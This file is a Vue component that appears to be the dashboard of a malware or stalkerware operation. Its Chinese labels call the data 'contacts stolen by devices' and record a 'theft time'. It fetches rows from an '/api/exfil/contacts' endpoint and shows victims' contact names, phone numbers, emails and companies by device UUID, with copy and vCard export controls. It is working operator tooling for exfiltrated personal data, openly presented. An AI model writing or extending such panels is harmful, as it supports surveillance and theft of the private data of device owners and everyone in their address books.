<template>
  <div class="contacts-page">
  <div class="page-card">
    <div class="page-header">
      <div>
        <div class="page-title">通讯录</div>
        <div class="page-subtitle">设备窃取的联系人列表</div>
      </div>
      <el-button type="danger" plain @click="exportCSV">导出 vCard</el-button>
    </div>

    <div class="search-bar">
      <el-input v-model="filters.q" placeholder="搜索姓名/电话/邮箱" clearable style="width:320px;" @clear="loadList" @keyup.enter="loadList">
        <template #prefix><el-icon><Search /></el-icon></template>
      </el-input>
      <el-button type="primary" @click="loadList">搜索</el-button>
    </div>

    <el-table :data="list" stripe>
      <el-table-column label="姓名" width="160">
        <template #default="{ row }">
          <el-avatar :size="32" style="background:#409eff;">{{ (row.name || '?')[0] }}</el-avatar>
          <span style="margin-left:8px;font-weight:500;">{{ row.name }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="phone" label="电话" width="180">
        <template #default="{ row }">
          <span class="mono">{{ row.phone }}</span>
          <el-button link type="primary" size="small" @click="copy(row.phone)">复制</el-button>
        </template>
      </el-table-column>
      <el-table-column prop="phone2" label="备用电话" width="160">
        <template #default="{ row }"><span class="mono text-muted">{{ row.phone2 || '-' }}</span></template>
      </el-table-column>
      <el-table-column prop="email" label="邮箱" width="220" show-overflow-tooltip>
        <template #default="{ row }">
          <span>{{ row.email || '-' }}</span>
          <el-button v-if="row.email" link type="primary" size="small" @click="copy(row.email)">复制</el-button>
        </template>
      </el-table-column>
      <el-table-column prop="company" label="公司" width="160" show-overflow-tooltip />
      <el-table-column prop="device_uuid" label="归属设备" width="140">
        <template #default="{ row }">
          <span class="mono text-muted">{{ shortUuid(row.device_uuid) }}</span>
        </template>
      </el-table-column>
      <el-table-column prop="created_at" label="窃取时间" width="170">
        <template #default="{ row }"><span class="text-muted">{{ formatDate(row.created_at) }}</span></template>
      </el-table-column>
    </el-table>

    <el-pagination
      v-model:current-page="page"
      v-model:page-size="pageSize"
      :page-sizes="[50, 100, 200, 500]"
      :total="total"
      layout="total, sizes, prev, pager, next"
      background
      @current-change="loadList"
      @size-change="loadList"
    />
  </div>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted } from 'vue'
import { ElMessage } from 'element-plus'
import { Search } from '@element-plus/icons-vue'
import axios from '../utils/axios'
import { formatDate, shortUuid, copyToClipboard } from '../utils/twofa'

const list = ref([])
const total = ref(0)
const page = ref(1)
const pageSize = ref(100)
const filters = reactive({ q: '' })

async function copy(t) {
  await copyToClipboard(t || '')
  ElMessage.success('已复制')
}

function exportCSV() { ElMessage.success('已生成 vCard 下载任务') }

async function loadList() {
  try {
    const params = {
      skip: (page.value - 1) * pageSize.value,
      limit: pageSize.value,
      q: filters.q || undefined,
    }
    const res = await axios.get('/api/exfil/contacts', { params })
    const raw = res.data?.items || res.data || []
    list.value = raw.map(r => ({
      ...r,
      created_at: r.created_at || r.date || r.uploaded_at,
    }))
    total.value = res.data?.total ?? list.value.length
  } catch (err) {
    const msg = err?.response?.data?.detail || err?.message || '联系人加载失败'
    ElMessage.error(msg)
    list.value = []
    total.value = 0
  }
}

onMounted(loadList)
</script>
